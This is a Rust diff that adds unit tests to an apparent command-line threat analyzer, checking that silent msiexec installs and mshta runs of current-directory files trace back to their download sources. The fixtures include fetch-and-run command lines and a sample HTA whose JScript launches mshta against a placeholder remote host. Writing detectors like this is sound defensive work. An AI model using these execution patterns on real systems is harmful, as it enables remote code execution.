@@ -10898,7 +10898,7 @@ mshta payload.hta"#,
 #[cfg(test)]
 mod msiexec_tests {
     use crate::analyze;
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
 
@@ -11099,6 +11099,31 @@ msiexec /i ScreenConnect.ClientSetup.msi /qn"#,
         assert!(
             has,
             "msiexec basename package did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_current_dir_package_resolves_tracked_download_source() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "setup.msi".to_string(),
+            FsEntry::Download {
+                src: "https://msiexec-current-dir.example/setup.msi".to_string(),
+            },
+        );
+        interpret_line(r"msiexec /i .\setup.msi /qn", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == r"msiexec /i .\setup.msi /qn"
+                        && url == "https://msiexec-current-dir.example/setup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec current-dir package did not resolve tracked download source: {:?}",
             env.traits
         );
     }
@@ -11714,6 +11739,31 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn mshta_current_dir_hta_resolves_tracked_download_source() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "payload.hta".to_string(),
+            FsEntry::Download {
+                src: "https://mshta-current-dir.example/payload.hta".to_string(),
+            },
+        );
+        interpret_line(r"mshta .\payload.hta", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == r"mshta .\payload.hta"
+                        && url == "https://mshta-current-dir.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta current-dir HTA did not resolve tracked download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn mshta_local_hta_content_queues_script_block() {
         let mut env = Environment::new(&Config::default());
         let hta = br#"<html><script language="JScript">
@@ -11735,6 +11785,32 @@ new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payloa
                     .any(|window| window == b"mshta-local-content.example")
             }),
             "local HTA script block was not queued for scanning: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
+    fn mshta_current_dir_hta_content_queues_script_block() {
+        let mut env = Environment::new(&Config::default());
+        let hta = br#"<html><script language="JScript">
+new ActiveXObject("WScript.Shell").Run("mshta mshta-current-dir-content.example/payload.hta");
+</script></html>"#
+            .to_vec();
+        env.modified_filesystem.insert(
+            "payload.hta".to_string(),
+            FsEntry::Content {
+                content: hta,
+                append: false,
+            },
+        );
+        interpret_line(r"mshta .\payload.hta", &mut env);
+        assert!(
+            env.all_extracted_jscript.iter().any(|payload| {
+                payload
+                    .windows(b"mshta-current-dir-content.example".len())
+                    .any(|window| window == b"mshta-current-dir-content.example")
+            }),
+            "current-dir HTA script block was not queued for scanning: {:?}",
             env.all_extracted_jscript
         );
     }
